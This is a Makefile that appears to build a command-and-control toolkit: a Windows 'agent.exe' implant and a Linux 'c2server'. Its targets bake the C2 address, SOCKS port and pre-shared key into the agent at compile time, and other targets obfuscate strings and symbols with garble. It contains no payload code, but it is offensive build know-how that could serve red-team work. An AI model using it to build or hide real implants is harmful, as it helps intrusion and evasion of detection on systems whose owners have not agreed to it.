.PHONY: all client server tools clean dist garble-client garble-server

# ─── compiler flags ────────────────────────────────────────────────────────────
GOFLAGS   := -trimpath
# Strip debug info and symbol table for smaller, cleaner binaries
LDFLAGS   := -w -s
# Force fully static binaries: disable CGO so the Go toolchain uses its own
# pure-Go network/syscall implementations even on native Linux builds.
export CGO_ENABLED := 0

# ─── output paths ──────────────────────────────────────────────────────────────
OUT_CLIENT := dist/agent.exe
OUT_SERVER := dist/c2server

all: dist client server

dist:
	@mkdir -p dist

# ─── standard build ────────────────────────────────────────────────────────────
# Cross-compile Windows amd64 agent
client: dist
	GOOS=windows GOARCH=amd64 go build $(GOFLAGS) -ldflags "$(LDFLAGS)" -o $(OUT_CLIENT) ./cmd/client

# Build Linux amd64 C2 server
server: dist
	GOOS=linux GOARCH=amd64 go build $(GOFLAGS) -ldflags "$(LDFLAGS)" -o $(OUT_SERVER) ./cmd/server

# ─── custom C2 address baked in at compile time ─────────────────────────────────
# Usage: make client-baked C2=2001:db8::1 SPORT=1080 POLL=50 PSK=mysecret
C2    ?= ::1
SPORT ?= 1080
POLL  ?= 50
PSK   ?=
LFLAGS_BAKED := $(LDFLAGS) -X main.defaultC2=$(C2) -X main.defaultSocksPort=$(SPORT) -X main.defaultPollMs=$(POLL) -X main.defaultPSK=$(PSK)

client-baked: dist
	GOOS=windows GOARCH=amd64 go build $(GOFLAGS) -ldflags "$(LFLAGS_BAKED)" -o $(OUT_CLIENT) ./cmd/client

server-baked: dist
	GOOS=linux GOARCH=amd64 go build $(GOFLAGS) -ldflags "$(LFLAGS_BAKED)" -o $(OUT_SERVER) ./cmd/server

# ─── garble build (full string + symbol obfuscation) ────────────────────────────
# Requires: go install mvdan.cc/garble@latest
garble-client: dist
	GOOS=windows GOARCH=amd64 garble -literals -tiny build -o $(OUT_CLIENT) ./cmd/client

garble-server: dist
	GOOS=linux GOARCH=amd64 garble -literals -tiny build -o $(OUT_SERVER) ./cmd/server

# ─── helper tool ───────────────────────────────────────────────────────────────
tools:
	go build -o tools/strenc/strenc ./tools/strenc

# ─── cleanup ───────────────────────────────────────────────────────────────────
clean:
	rm -rf dist/
